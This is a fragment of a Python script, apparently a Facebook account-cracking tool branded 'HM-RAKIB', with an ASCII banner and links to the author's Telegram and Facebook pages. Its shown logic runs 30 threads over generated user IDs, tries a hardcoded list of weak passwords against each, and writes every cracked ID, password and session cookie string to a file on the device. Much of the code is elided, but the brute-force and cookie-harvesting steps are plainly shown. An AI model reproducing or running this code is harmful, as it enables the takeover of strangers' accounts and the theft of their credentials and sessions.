...
os.system("clear");print("\n\n  \033[1;93m1-1-2024 IS HM-RAKIB \n\n");time.sleep(3);os.system('xdg-open https://github.com/ckrakib100/HM-RAKIB1 ')
try:
...
def hasan_ua1():
	...
	return ua
#-----------------------------------------------------#
sys.stdout.write('\x1b]2; ꧁☠[🔥]=[HM-RAKIB]=[🔥]☠꧂\x07')
#-----------------------------------------------------#
#-----------Logo------------#
os.system('clear')
priti = """ \033[1;92m
  _    _ __  __        _____            _  _______ ____   
 | |  | |  \/  |      |  __ \     /\   | |/ /_   _|  _ \  
 | |__| | \  / |______| |__) |   /  \  | ' /  | | | |_) | 
 |  __  | |\/| |______|  _  /   / /\ \ |  <   | | |  _ <  
 | |  | | |  | |      | | \ \  / ____ \| . \ _| |_| |_) | 
 |_|  |_|_|  |_|      |_|  \_\/_/    \_\_|\_\_____|____/  
           ...
           \033[1;33m ۝࿐ \033[38;5;85mHM-RAKIB  \033[93m࿐۝
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
      \x1b[93m  HM-RAKIB  1 JANUARY 2024
      \x1b[92m OWNER \x1b[93m : \x1b[92m HM-RAKIB HOSSAIN   
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
"""
def lvl():
...
#-----------Admin Info------------#
def admin_group():
	os.system('xdg-open https://t.me/hmrakib11/');clear();Rakib ()
def admin_id():
	os.system('xdg-open https://www.facebook.com/cmd.sakib.7');clear();Rakib ()
def admin_page():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100079096377936');clear();Rakib ()
#------Locked Id Remove------#			
def lock(uid):
...
def all_country():
	...
	if '03' in code:
		...
		print(' \033[38;5;192m~\033[38;5;44m>\033[1;91m WORNING TYP SIR');admin_group();time.sleep(3);clear();Rakib ()
	try:
	...
	with tred(max_workers=30) as hasan:
		...
		for psx in user:
			...
			if 'pk' in ck:
				...
				passlist = ['00998877','sumaiya','Rakib ','sadiya','nazmul','saiful','soniya','203040','304050','bangladesh','506070','708090','607080','@@@###','908070','jesmin','১২৩৪৫৬','১১২২৩৩','১২৩৪৫৬৭৮','77889900',ids,psx]
			elif 'ind' in ck:
...
def asha(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r \033[1;91m [\033[1;32mRAKIB -CRACK\033[1;91m] \033[1;93m%s\033[1;37m <> \033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r \033[1;31m [\033[1;92mRAKIB -OK\033[1;91m] \033[1;92m'+uid+' > '+pas)
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				open('/sdcard/RAKIB -RANDOM-OK-COOKIES.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				oks.append(uid)
				break
